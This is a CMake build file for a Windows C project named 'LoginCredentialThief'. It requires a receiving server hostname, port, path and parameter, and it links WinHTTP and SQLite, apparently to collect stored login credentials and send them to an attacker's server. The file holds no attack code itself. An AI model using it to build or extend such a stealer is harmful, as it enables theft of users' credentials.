cmake_minimum_required(VERSION 3.10)

# Genearete "compile_commands.json" for ease of C lintering
set(CMAKE_EXPORT_COMPILE_COMMANDS ON)

# Configuring build type for appropriate compilation
option(BUILDTYPE "Build Type ( Release, Debug, RelWithDebInfo, MinSizeRel )" Debug)
set(CMAKE_BUILD_TYPE ${BUILDTYPE})

string(TOLOWER ${BUILDTYPE} BTL)

# Setting project information
project(LoginCredentialThief VERSION 1.0)

# Setting config file to automatically generate Hostname, Port, Path, ... header file
set(CONFIGFILE "Config.h")

# Getting compliation options from CLI
option(HOSTNAME "Server Hostname")
option(PORT "Server Port" 80)
option(PATH "Recieving Path" "/")
option(PARAM "Recieving Parameter" "data")

# Throw error when there was no HOSTNAME in options ( REQUIRED )
if(NOT HOSTNAME)
  message(SEND_ERROR "No Hostname Specified!\n use -DHOSTNAME=\"Target IP/Hostname\"")
endif()

# Set C Version
set(CMAKE_C_STANDARD 11)
set(CMAKE_C_STANDARD_REQUIRED TRUE)

# Auto generate config header
configure_file(Config.h.in ${CONFIGFILE})

file(GLOB src 
  "${PROJECT_SOURCE_DIR}/src/*.c")

file(GLOB include 
  "${PROJECT_SOURCE_DIR}/include/*.h")

# Create executable
add_executable(${PROJECT_NAME} ${src} ${include})

# Pass CONFIGFILE to project as a preprocessor ( to be included easily )
target_compile_definitions(${PROJECT_NAME} PRIVATE CONFIG="${CONFIGFILE}")

# Pass build type to project
if(${BTL} STREQUAL "debug")
  target_compile_definitions( ${PROJECT_NAME} PRIVATE DEBUG=1)
elseif(${BTL} STREQUAL "release")
  target_compile_definitions( ${PROJECT_NAME} PRIVATE RELEASE=1)
elseif(${BTL} STREQUAL "minsizerel")
  target_compile_definitions( ${PROJECT_NAME} PRIVATE RELEASE=1)
elseif(${BTL} STREQUAL "relwithdebinfo")
  target_compile_definitions( ${PROJECT_NAME} PRIVATE DEBUG=1)
else()
  message(SEND_ERROR "Unknown Build Type")
endif()

add_subdirectory(sqlite3)

# Add project binary directory to include path ( for including CONFIGFILE )
target_include_directories(${PROJECT_NAME} PUBLIC 
  "${PROJECT_SOURCE_DIR}/include"
  ${PROJECT_BINARY_DIR}
  )

target_link_libraries( ${PROJECT_NAME} PRIVATE winhttp sqlite3 )
